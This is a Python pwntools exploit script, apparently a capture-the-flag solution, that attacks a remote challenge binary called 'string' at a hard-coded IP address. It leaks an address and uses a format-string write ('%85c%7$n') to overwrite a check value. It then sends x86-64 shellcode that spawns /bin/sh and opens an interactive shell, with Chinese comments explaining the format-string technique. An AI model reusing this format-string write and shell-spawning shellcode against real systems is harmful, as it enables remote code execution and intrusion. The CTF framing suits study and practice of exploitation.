from pwn import *
'''
    @Author:            Tokyoveryhot
    @Date:              2020-08-02
    @Version:           1.0.0
'''
#context.log_level = 'debug'
context(arch='arm64',os='linux',log_level='debug')
conn = remote('220.249.52.133', 40333)
elf = ELF('./string')
conn.recvuntil('secret[0] is ')
#接收secret[0]的值，即*v5(v5[0])
addr = int(conn.recvuntil('\n')[:-1], 16)
#打印v5[0]的地址
log.info("v5 addr:"+hex(addr))

#进入sub_4000D72()
conn.sendlineafter('What should your character\'s name be:', 'aaaa')
#进入sub_400A7D()
conn.sendlineafter('So, where you will go?east or up?:', 'east')
#进入sub_400BB9():printf处存在格式化字符串漏洞，利用这一点去修改v3[0]的值为85
conn.sendlineafter('go into there(1), or leave(0)?:', '1')
conn.sendlineafter('\'Give me an address\'', str(addr))
# 使用 *<a_number_of_chars>%<number>$n* 就可以将相应的第 *<number>* 个参数的位置写为 % 前输出的字符数量
# 如本题先用 %85c 输出了85个字符，再用 %7$n 将第七个参数的位置写成了85
conn.sendlineafter('And, you wish is:', '%85c%7$n')
#conn.sendlineafter('And, you wish is:', 'a'*85+'%7$n')
#shellcode获得执行system("/bin/sh")的汇编代码所对应的机器码
shellcode = '\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05'
conn.sendlineafter('USE YOU SPELL', shellcode)
conn.interactive()
#养成良好习惯
conn.close()
